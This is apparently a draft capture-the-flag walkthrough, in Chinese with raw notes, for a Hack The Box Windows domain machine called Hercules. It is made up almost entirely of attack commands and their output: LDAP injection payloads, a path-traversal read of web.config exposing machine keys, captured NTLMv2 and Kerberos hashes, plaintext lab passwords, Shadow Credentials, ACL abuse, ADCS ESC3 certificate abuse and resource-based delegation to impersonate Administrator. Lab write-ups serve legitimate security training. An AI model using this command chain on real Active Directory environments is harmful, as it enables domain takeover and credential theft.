---
draft: true
title: Hercules
date: 2025-10-23
weight: -778
tags:
  - windows
  - insane
  - winrm
  - rid-cycling
---

![hercules_rank.png](hercules_rank.png)

## 00. 摘要

1. 扫目录
2. 利用kerberos pre_auth进行用户名枚举
3. LDAP注入
4. 任意文件读取
5. Cookie伪造越权
6. 文件上传+NTLM反射
7. Shadow Credential
8. ACL滥用
9. ADCS ESC3
10. 恶意利用运维脚本
11. 使用无SPN的账户进行基于资源的约束性委派

```bash
$ rustscan -u 5000 -a 10.129.162.185   
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
With RustScan, I scan ports so fast, even my firewall gets whiplash 💨

[~] The config file is expected to be at "/home/lambermaybe/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.129.162.185:53
Open 10.129.162.185:80
Open 10.129.162.185:88
Open 10.129.162.185:135
Open 10.129.162.185:139
Open 10.129.162.185:389
Open 10.129.162.185:443
Open 10.129.162.185:445
Open 10.129.162.185:464
Open 10.129.162.185:593
Open 10.129.162.185:636
Open 10.129.162.185:3268
Open 10.129.162.185:3269
Open 10.129.162.185:9389
Open 10.129.162.185:49556
Open 10.129.162.185:49580
Open 10.129.162.185:49664
Open 10.129.162.185:49668
Open 10.129.162.185:50811
Open 10.129.162.185:58667
Open 10.129.162.185:58674
```

```
*)(&
*))%00
*)(uid=*))(|(uid=*	
(
)
)(cn=))\x00	
*)(uid=*))(|(uid=*

_
@
{
}
-
/
(
)
!
"
$
%
=
^
[
]
:
;




adriana.i
angelo.o
anthony.r
ashley.b
auditor
bob.w
camilla.b
clarissa.c
elijah.m
fernando.r
fiona.c
harris.d
heather.s
jacob.b
james.s
jennifer.a
jessica.e
joel.c
johanna.f
johnathan.j
ken.w  --> change*th1s_p@ssw()rd!!
mark.s
mikayla.a
natalie.a
nate.h
patrick.s
ramona.l
ray.n
rene.s
shae.j
stephanie.w
stephen.m
tanya.r
taylor.m
tish.c
vincent.g
web_admin
will.s
winda.s
zeke.s



https://10.129.162.185/Home/Download?fileName=../../web.config
```



```
HTTP/2 200 OK
Cache-Control: private, s-maxage=0
Content-Type: application/octet-stream
Server: Microsoft-IIS/10.0
Content-Disposition: attachment; filename="../../web.config"
Date: Mon, 20 Oct 2025 18:49:06 GMT
Content-Length: 4896

<?xml version="1.0" encoding="utf-8"?>
<!--
  For more information on how to configure your ASP.NET application, please visit
  https://go.microsoft.com/fwlink/?LinkId=301880
  -->
<configuration>
  <appSettings>
    <add key="webpages:Version" value="3.0.0.0" />
    <add key="webpages:Enabled" value="false" />
    <add key="ClientValidationEnabled" value="true" />
    <add key="UnobtrusiveJavaScriptEnabled" value="true" />
  </appSettings>
  <!--
    For a description of web.config changes see http://go.microsoft.com/fwlink/?LinkId=235367.

    The following attributes can be set on the <httpRuntime> tag.
      <system.Web>
        <httpRuntime targetFramework="4.8.1" />
      </system.Web>
  -->
  <system.web>
    <compilation targetFramework="4.8" />
    <authentication mode="Forms">
      <forms protection="All" loginUrl="/Login" path="/" />
    </authentication>
    <httpRuntime enableVersionHeader="false" maxRequestLength="2048" executionTimeout="3600" />
    <machineKey decryption="AES" decryptionKey="B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581" validation="HMACSHA256" validationKey="EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80" />
    <customErrors mode="Off" />
  </system.web>
  <runtime>
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <dependentAssembly>
        <assemblyIdentity name="System.Web.Helpers" publicKeyToken="31bf3856ad364e35" />
        <bindingRedirect oldVersion="1.0.0.0-3.0.0.0" newVersion="3.0.0.0" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="System.Web.WebPages" publicKeyToken="31bf3856ad364e35" />
        <bindingRedirect oldVersion="1.0.0.0-3.0.0.0" newVersion="3.0.0.0" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="System.Web.Mvc" publicKeyToken="31bf3856ad364e35" />
        <bindingRedirect oldVersion="1.0.0.0-5.3.0.0" newVersion="5.3.0.0" />
      </dependentAssembly>
      <dependentAssembly>
        <assemblyIdentity name="Microsoft.Web.Infrastructure" publicKeyToken="31bf3856ad364e35" culture="neutral" />
        <bindingRedirect oldVersion="0.0.0.0-2.0.0.0" newVersion="2.0.0.0" />
      </dependentAssembly>
    </assemblyBinding>
  </runtime>
  <system.webServer>
    <httpProtocol>
      <customHeaders>
        <remove name="X-AspNetMvc-Version" />
        <remove name="X-Powered-By" />
        <add name="Connection" value="keep-alive" />
      </customHeaders>
    </httpProtocol>
    <security>
      <requestFiltering>
        <requestLimits maxAllowedContentLength="2097152" />
      </requestFiltering>
    </security>
    <rewrite>
      <rules>
        <rule name="HTTPS Redirect" stopProcessing="true">
          <match url="(.*)" />
          <conditions>
            <add input="{HTTPS}" pattern="^OFF$" />
          </conditions>
          <action type="Redirect" url="https://{HTTP_HOST}{REQUEST_URI}" redirectType="Permanent" />
        </rule>
      </rules>
    </rewrite>
    <httpErrors errorMode="Custom" existingResponse="PassThrough">
      <remove statusCode="404" subStatusCode="-1" />
      <error statusCode="404" path="/Error/Index?statusCode=404" responseMode="ExecuteURL" />
      <remove statusCode="500" subStatusCode="-1" />
      <error statusCode="500" path="/Error/Index?statusCode=500" responseMode="ExecuteURL" />
      <remove statusCode="501" subStatusCode="-1" />
      <error statusCode="501" path="/Error/Index?statusCode=501" responseMode="ExecuteURL" />
      <remove statusCode="503" subStatusCode="-1" />
      <error statusCode="503" path="/Error/Index?statusCode=503" responseMode="ExecuteURL" />
      <remove statusCode="400" subStatusCode="-1" />
      <error statusCode="400" path="/Error/Index?statusCode=400" responseMode="ExecuteURL" />
    </httpErrors>
  </system.webServer>
  <system.codedom>
    <compilers>
      <compiler language="c#;cs;csharp" extension=".cs" warningLevel="4" compilerOptions="/langversion:default /nowarn:1659;1699;1701;612;618" type="Microsoft.CodeDom.Providers.DotNetCompilerPlatform.CSharpCodeProvider, Microsoft.CodeDom.Providers.DotNetCompilerPlatform, Version=4.1.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
      <compiler language="vb;vbs;visualbasic;vbscript" extension=".vb" warningLevel="4" compilerOptions="/langversion:default /nowarn:41008,40000,40008 /define:_MYTYPE=\&quot;Web\&quot; /optionInfer+" type="Microsoft.CodeDom.Providers.DotNetCompilerPlatform.VBCodeProvider, Microsoft.CodeDom.Providers.DotNetCompilerPlatform, Version=4.1.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
    </compilers>
  </system.codedom>
</configuration>
<!--ProjectGuid: 6648C4C4-2FF2-4FF1-9F3E-1A560E46AA52-->
```


```
[SMB] NTLMv2-SSP Client   : 10.129.162.185
[SMB] NTLMv2-SSP Username : HERCULES\natalie.a
[SMB] NTLMv2-SSP Hash     : natalie.a::HERCULES:b8ab11fe0325dc1f:5DBFC1C696ABE315994361D7C0602CDC:0101000000000000801D523FE341DC0165EA338122C81F7B0000000002000800430059004F00440001001E00570049004E002D005300570043003800320054005100560054005700590004003400570049004E002D00530057004300380032005400510056005400570059002E00430059004F0044002E004C004F00430041004C0003001400430059004F0044002E004C004F00430041004C0005001400430059004F0044002E004C004F00430041004C0007000800801D523FE341DC0106000400020000000800300030000000000000000000000000200000E8462BC485281D1D07DCB31D348D8C3060188BF0818A694DBB92A327CBE1FB100A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100300037000000000000000000

natalie.a / Prettyprincess123!  --> smb share lnk快捷方式暂时没权限

GenericWrite
--> 

bob.w

---
# cat /IT/notice.eml
--_004_MEYP282MB3102AC3B2MEYP282MB3102AUSP_
Content-Type: multipart/alternative;
	boundary="_000_MEYP282MB3102AC3E29FED8B2MEYP282MB3102AUSP_"

--_000_MEYP282MB3102AC3E2MEYP282MB3102AUSP_
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: quoted-printable
________________________________
From: Ashley Browne
Sent: Tuesday 10:17:27 AM
To: IT Support <HERCULES\IT Support@HERCULES.HTB>
Subject: Password Reset

Hey Team,

The Administration has provided a solution to much of the permission issues=
some of you have been facing.

If you are having problems changing a password, the instructions are:

1) Check AD Permissions against the user.
2) Run the shortcut provided in the share.
3) Try to reset the password again.

If all else fails, send me a message.

Regards, Ashley.

--_000_MEYP282MB3102AC3E21A33MEYP282MB3102AUSP_
Content-Type: text/html; charset="us-ascii"
Content-Transfer-Encoding: quoted-printable
---

targetedKerberoast.py -v -d 'hercules.htb' --dc-ip 10.129.162.185 -u 'natalie.a' -p 'Prettyprincess123!' -k --request-user bob.w --only-abuse --dc-host 'dc.hercules.htb'

$krb5tgs$23$*bob.w$HERCULES.HTB$hercules.htb/bob.w*$c95ddf5fd0be1f2ce71ed14731d65e0b$70e1e4fd2d59a4536bec84fafc8b84d3a8a86c5228542b8a31ce93f241c5895467b0ec1b5ce87356e19be89d5d71ae56b667c2764867ff179af4fd761f05d70f71aec6c8de763fce1a5b130a1a46d49468081cce48d9c59c2a13514bf46c819551bd26006318b7facec1280d9c1768c40d322d4293767029b8551e7b111c9d936308b73f5ae7fb320fc1f16ec9852dc0f661d228f47a0c13efd1cf55011a4773e9c72d5f644ca770c8bfec663170be3eb11c3cac271e75e14ed3b8fc3cd9ed84f4c207a8e65350d26b783c713038bc0cb4ecd44b87861d7f0435aadce18b822f57bccedac9e99c1e5b998b7b949e432b64f9273adadcd561aff5f3ed18c93b162249f374dffc9e8597ef9d209ff172bbac973098bef7fd7d138db234cf1c31e9216c318965120995a2fc1e27272c188ffa9ff5f55e7889da3b7d2880acef6dd77c0d6e4e7b3d6b8a861c9007790736942e445f3302e1a78dacab74414647bd3425b25d888117bdd6836a2c957d17955d5dbc3695c4dd4621a93338c022cce688c2a2b486f15eec9ce1ffb4f86f6cb2881a28bcf1644a76cf2e5e95be27985e9709f2e5df55f32190dc7346ff6f87c67932858d81b4ab367ec9f78305e32f66e93326bf065dcad265ee7e9b2d92ccef874028976350e00975125dd26ea08bf482d9ee65a28e69ef39096b2be8fbfb35299713d61e386ad0e7e6d2a9264c2dfbf37d8672c7b5e7d1911d2e39250bb503d9c03996f096dd515912ad73706142c75ece74d8dd6d9e8be55389b4828e80c746bee981651559be98e01d0dec676bead1be48c33f7b4b6cf30943efb1b6b016dc888a4cb3f7a80f0a4267ef280dab7660e6322ec2c0ad1b31cf245a6ceadf2afc516f650f7d750f5ce08cfad588bbc504c92757f17bcdd8979b68bf933b99037e1564480ac95bc59b006413d638fa9222a723df0127b812982a9a838b0cd6ab2afe73371260019740c9949b7e8444813dd3e71f937482ce01de87146d3d7e367feae1ad9976f77707047e2f34f58353e82746036194f7e3d77e9c1590f83c5763ed65276d8e96ab10d5f2215c9d165aaf19dd7907a16fd0cfb1ea43bfe32e924838447d1e00d41e4043773c33077f10cdae85659eee2c4daee04c1dafc1665729e0dba7e5cc9d670ad9e4928eb50ded7372e1f664d90955a8d028c9e6bd30437bef29a33fa88159347a3bfe61f338735261d59e8ca1b2a8e5ca84134cfdfc97bc8777ad78950f8f07a63a55de0d0c6ca373be9b3c7216361a3f5d3ec837a68c82966d5dc71e20efc5b7309b92078ef2242ace197524b7510dcb614776b3ee2baed1102814457b16a9cccd75e96c207aa9aaac76a90747c2e7b5b0bfee0fd16ef762ce3ac407e1fb2ec7b5bd859dacca442d04d5929ed0d9ebc597b66555ad8de625d8a2412fc3740777ead449eb9a437494c9d3fd07b27d7b9fe63ab3998adc8837692ea8c0292ef906120ccde7aa162a6363b0865230a9ac952f0d49b09f37343e27c81ddb5dc8ffca37e9f1c381c9c5e120c7d713be


uv tool install .
python3 pywhisker/pywhisker.py -d 'hercules.htb' -u 'natalie.a' -p 'Prettyprincess123!' -k --target 'bob.w' --action 'add' -P 'PFX_PASSWORD' -f 'lamber' --dc-host 'dc.hercules.htb'

python3 PKINITtools/gettgtpkinit.py -cert-pfx 'lamber.pfx' -pfx-pass 'PFX_PASSWORD' 'hercules.htb'/'bob.w' lamber.ccache 



python3 PKINITtools/gets4uticket.py kerberos+ccache://zsm.local\\ZPH-SVRMGMT1\$:lamber.ccache@zsm.local CIFS/ZPH-SVRMGMT1.zsm.local@zsm.local Administrator@zsm.local Administrator.ccache

export KRB5CCNAME=/root/Tools/out.ccache
impacket-psexec zsm.local/Administrator@ZPH-SVRMGMT1.zsm.local -k -no-pass



export KRB5CCNAME=lamber.ccache
python PKINITtools/getnthash.py hercules.htb/bob.w -key 12d6e89f1ebcbd66e79ff80e03ff6e4451d6e33ef4f01ab9aadad4841732dfbb

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
8a65c74e8f0073babbfac6725c66cc3f


bloodyAD.py --host dc.hercules.htb -d hercules.htb -u bob.w -k --dc-ip 10.129.162.185 get writable
```

bob.w 的可写权限

```
需要 SECURITY HELPDESK 组成员

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=hercules,DC=htb
permission: WRITE

distinguishedName: OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: CREATE_CHILD; WRITE

distinguishedName: OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: CREATE_CHILD; WRITE

distinguishedName: OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: CREATE_CHILD; WRITE

distinguishedName: CN=Auditor,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Vincent Gray,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Nate Hicks,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Mark Stone,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Elijah Morrison,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Angelo Onclarit,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Will Smith,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Zeke Solomon,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Adriana Italia,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Tish Ckenvkitch,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Jennifer Ankton,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Shae Jones,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Joel Conwell,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Jacob Bentley,OU=Engineering Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=web_admin,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Bob Wood,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Ken Wiggins,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Johnathan Johnson,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Harris Dunlop,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE

distinguishedName: CN=Ray Nelson,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
permission: WRITE



bloodyAD.py --host dc.hercules.htb -d hercules.htb -u bob.w -k --dc-ip 10.129.162.185 get -n "CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb" --filter-right "WriteDACL"
```

写入控制Stephen Miller
```


impacket-getTGT 'hercules.htb'/'bob.w' -hashes :8a65c74e8f0073babbfac6725c66cc3f
export KRB5CCNAME=bob.w.ccache
python3 pywhisker/pywhisker.py -d 'hercules.htb' -u 'bob.w' --no-pass -k --target 'stephen.m' --action 'add' -P 'PFX_PASSWORD' -f 'lamber2' --dc-host 'dc.hercules.htb'



bloodyAD.py --host dc.hercules.htb --dc-ip 10.129.162.185 -u bob.w -k add groupMember "OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb" "CN=Bob Wood,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb"

bloodyAD.py --host dc.hercules.htb --dc-ip 10.129.162.185 -u bob.w -k add user  --ou "OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb" 'lamber' 'Password1@'

# 改密码 - 失败
bloodyAD.py --host dc.hercules.htb -d hercules.htb -u bob.w -k --dc-ip 10.129.150.177 set password 'CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb' 'NewPassword123!'

# 添加 Shadow Credentials - 403权限不够
bloodyAD.py --host dc.hercules.htb -d hercules.htb -u bob.w -k --dc-ip 10.129.150.177 addShadowCredentials 'CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb'

# 添加恶意的 SPN
bloodyAD.py --host dc.hercules.htb -d hercules.htb -u bob.w -k --dc-ip 10.129.150.177 set object 'CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb' servicePrincipalName -v 'http/whatever'

403 
bloodyAD.py --host dc.hercules.htb -d hercules.htb -u bob.w -k --dc-ip 10.129.150.177 set object stephen.m servicePrincipalName -v 'http/whatever'

# 把自己加到安全组 - 403
bloodyAD.py --host dc.hercules.htb -d hercules.htb -u bob.w -k --dc-ip 10.129.150.177 add groupMember 'OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb' bob.w

# 设置owner

bloodyAD.py --host dc.hercules.htb -d hercules.htb -u bob.w -k --dc-ip 10.129.150.177 set owner stephen.m bob.w

# 添加all

bloodyAD.py --host dc.hercules.htb -d hercules.htb -u bob.w -k --dc-ip 10.129.150.177 add genericAll stephen.m bob.w

# 添加计算机到 Security 组
bloodyAD.py --host dc.hercules.htb -d hercules.htb -u bob.w -k --dc-ip 10.129.150.177 add computer --ou 'OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb' 'Lamber' 'NewPassword1!'

[+] Lamber$ created

# 添加Stephen Miller到 Web Department 组
bloodyAD.py --host dc.hercules.htb --dc-ip 10.129.150.177 -u bob.w -k add groupMember "OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb" "CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb"


# 添加Stephen Miller到 Web Department 组
bloodyAD.py --host dc.hercules.htb --dc-ip 10.129.150.177 -u bob.w -k set object "CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb" -v "CN=Stephen Miller,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb"


certipy find -k -dc-ip 10.129.150.177 -target dc.hercules.htb -enabled -vulnerable -stdout




# give oorend user GenericAll rights over the Service Users OU
bloodyAD.py --host dc.hercules.htb --dc-ip 10.129.150.177 -u bob.w -k add genericAll "OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb" bob.w

```

```
stephen.m


$ bloodyAD.py --host dc.hercules.htb -d hercules.htb -u natalie.a -p 'Prettyprincess123!' -k --dc-ip 10.129.150.177 add shadowCredentials stephen.m
[+] KeyCredential generated with following sha256 of RSA key: a10ba13001117e42554f4dd88fa9ff12ba36e952a816b8a05889b64bc677b9c5
[+] TGT stored in ccache file stephen.m_QQ.ccache

NT: 9aaaedcb19e612216a2dac9badb3c210

impacket-getTGT 'hercules.htb'/'stephen.m' -hashes :9aaaedcb19e612216a2dac9badb3c210


curl -LsSf https://astral.sh/uv/install.sh | sh
uv tool install git+https://github.com/aniqfakhrul/powerview.py

┌─[sg-dedivip-1]─[10.10.14.107]─[lambermaybe@htb-2mpjkjw391]─[~]
└──╼ [★]$ export KRB5CCNAME=stephen.m_QQ.ccache 

┌─[sg-dedivip-1]─[10.10.14.107]─[lambermaybe@htb-2mpjkjw391]─[~]
└──╼ [★]$ powerview hercules.htb/stephen.m@dc.hercules.htb -k --no-pass

╭─LDAPS─[dc.hercules.htb]─[HERCULES\stephen.m]-[NS:<auto>]
╰─PV ❯ Set-DomainUserPassword -Identity auditor -AccountPassword 'Password1@'
[2025-10-21 14:22:17] [Set-DomainUserPassword] Principal CN=Auditor,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb found in domain
[2025-10-21 14:22:17] [Set-DomainUserPassword] Password has been successfully changed for user auditor
[2025-10-21 14:22:17] Password changed for auditor


impacket-getTGT 'hercules.htb'/'auditor':'Password1@'

https://github.com/ozelis/winrmexec.git

python3 winrmexec.py 'hercules.htb'/'auditor'@'dc.hercules.htb' -k -ssl



powerview hercules.htb/auditor@dc.hercules.htb -k --no-pass
get-domainobjectacl -ResolveGUIDs -TableView csv -OutFile results.csv


impacket-smbclient hercules.htb/auditor@dc.hercules.htb -k -no-pass
bloodyAD.py --host dc.hercules.htb -d hercules.htb -u auditor -k --dc-ip 10.129.150.177 get writable



bloodyAD --host DC.hercules.htb -d hercules.htb -k add genericAll "OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB" ashley.b
[+] ashley.b has now GenericAll on OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB


```

```
rusthound-ce -d 'hercules.htb' -u 'auditor' -k -no-pass -f 'DC.hercules.htb'


dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'auditor' -target-dn 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' 'hercules.htb'/'auditor' -k -no-pass


Add-DomainObjectAcl -TargetIdentity "OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB" -PrincipalIdentity auditor -Rights fullcontrol -Inheritance

Set-DomainUserPassword -Identity fernando.r -AccountPassword 'Password1@2'

Set-ADUser -Identity "fernando.r" -Enabled $true

certipy find -k -dc-ip 10.129.150.177 -target dc.hercules.htb -enabled -vulnerable -stdout

uv run certipy req -k -dc-ip 10.129.150.177 -ca CA-HERCULES -template EnrollmentAgent -target dc.hercules.htb -debug

uv run certipy req -k -dc-ip 10.129.150.177 -target dc.hercules.htb -ca CA-HERCULES -template 'User' -pfx 'fernando.r.pfx' -on-behalf-of 'HERCULES\ashley.b' -dcom

$ uv run certipy auth -pfx 'ashley.b.pfx' -dc-ip 10.129.150.177 -ns 10.129.150.177
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'ashley.b@hercules.htb'
[*]     Security Extension SID: 'S-1-5-21-1889966460-2597381952-958560702-1135'
[*] Using principal: 'ashley.b@hercules.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ashley.b.ccache'
[*] Wrote credential cache to 'ashley.b.ccache'
[*] Trying to retrieve NT hash for 'ashley.b'
[*] Got hash for 'ashley.b@hercules.htb': aad3b435b51404eeaad3b435b51404ee:1e719fbfddd226da74f644eac9df7fd2

impacket-getTGT 'hercules.htb'/'ashley.b' -hashes :1e719fbfddd226da74f644eac9df7fd2
export KRB5CCNAME=ashley.b.ccache

python3 winrmexec.py 'hercules.htb'/'ashley.b'@'dc.hercules.htb' -k -ssl

```


```
PS C:\Users\ashley.b> tree /A /F
Folder PATH listing
Volume serial number is 0A8A-BD1A
C:.
+---Desktop
|   |   aCleanup.ps1
|   |   
|   \---Mail
|           RE_ashley.eml
|           
+---Documents
+---Downloads
+---Favorites
+---Links
+---Music
+---Pictures
+---Saved Games
+---Scripts
|       cleanup.ps1
|       
\---Videos

```

```
# 替换为你的 .lnk 完整路径
$lnkPath = 'C:\Shares\Department\IT\cleanup.lnk'

$wsh = New-Object -ComObject WScript.Shell
$lnk = $wsh.CreateShortcut($lnkPath)

$lnk | Select-Object @{n='LinkFile';e={$lnkPath}},@{n='TargetPath';e={$_.TargetPath}},@{n='Arguments';e={$_.Arguments}},@{n='WorkingDirectory';e={$_.WorkingDirectory}},@{n='IconLocation';e={$_.IconLocation}},@{n='Description';e={$_.Description}},@{n='WindowStyle';e={$_.WindowStyle}},@{n='Hotkey';e={$_.Hotkey}}

icacls "C:\Shares\Department\IT\cleanup.lnk"
```

授予 `IT SUPPORT` 组 GA 权限，这样运行脚本的时候就能移除 `iis_administrator` 账户的 `adminCount`

```
bloodyAD.py --host DC.hercules.htb -d hercules.htb -k add genericAll "OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB" "CN=IT SUPPORT,OU=DOMAIN GROUPS,OU=DCHERCULES,DC=HERCULES,DC=HTB"
```



```
Add-DomainObjectAcl -TargetIdentity "OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB" -PrincipalIdentity auditor -Rights fullcontrol -Inheritance


powerview hercules.htb/iis_administrator@dc.hercules.htb -k --no-pass

Set-DomainUserPassword -Identity 'iis_webserver$' -AccountPassword 'Password1@2'


getST.py -spn 'cifs/dc.hercules.htb' -impersonate 'admin' 'hercules.htb/iis_webserver$:Password1@2'
```


https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd?utm_source=chatgpt.com#rbcd-on-spn-less-users

```

getTGT.py -hashes :$(pypykatz crypto nt 'Password1@2') 'hercules.htb/iis_webserver$'

describeTicket.py 'iis_webserver$.ccache' | grep 'Ticket Session Key'

[*] Ticket Session Key            : 445ee59da762ba3051505a9a5e144c0b

changepasswd.py -newhashes :445ee59da762ba3051505a9a5e144c0b 'hercules.htb/iis_webserver$':'Password1@2'@'dc.hercules.htb' -k

# 这一步已经拿到ST了，可以拿权限了
KRB5CCNAME='iis_webserver$.ccache' getST.py -u2u -impersonate "Administrator" -spn "host/dc.hercules.htb" -k -no-pass 'hercules.htb/iis_webserver$'

# 这一步主要是复原操作
changepasswd.py -hashes :445ee59da762ba3051505a9a5e144c0b -newhashes :d7adef69d83a87a0377eba483ae3c2bf 'hercules.htb/iis_webserver$'@'dc.hercules.htb' -k
```